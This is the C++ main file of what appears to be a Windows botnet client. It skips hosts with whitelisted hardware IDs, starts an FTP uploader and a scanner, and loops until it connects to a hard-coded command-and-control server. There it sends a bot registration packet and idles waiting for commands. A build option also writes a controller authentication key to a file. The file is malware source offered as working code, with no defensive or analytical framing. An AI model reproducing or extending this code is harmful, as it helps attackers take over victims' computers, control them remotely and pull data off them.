#include "common.h"
#include "scanner.h"
#include "ftp_uploader.h"
#include <windows.h>
#include "client_sock.h"
#include "packets.h"
#include "controller_authkey.h"
#ifdef CONTROLLER_CLIENT
#include <fstream>
#endif // CONTROLLER_CLIENT
#include "hwid.h"


#ifdef _DEBUG
int main()
#else
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd)
#endif // _DEBUG
{
#ifdef CONTROLLER_CLIENT
	auto out = std::ofstream("key.txt");
	char key[32];
	generate_controller_authkey(key);
	out << "ae5172";
	for (int i = 0; i < 32; i++)
	{
		char buf[10];
		sprintf(buf, "%02x", (unsigned char)key[i]);
		out << buf;
	}
	out.close();

	return 0;
#endif // CONTROLLER_CLIENT


	if (is_whitelisted_hwid(get_hwid()))
	{
#ifdef _DEBUG
		printf("This computer is whitelisted!\r\n");
#else
		exit(0);
#endif // _DEBUG
	}

	ftp_init();
	init_winsocket();
	while (!socket_connect(CNC_SERVER_IP, CNC_SERVER_PORT));
#ifdef ENABLE_PRINTF
	printf("Connected to the C&C socket! Authenticating...\r\n");
#endif // ENABLE_PRINTF

	socket_send(packet_opcode::bot_register, &bot_register_payload(), sizeof(bot_register_payload));


	while (true) Sleep(1000);

	return 0;
}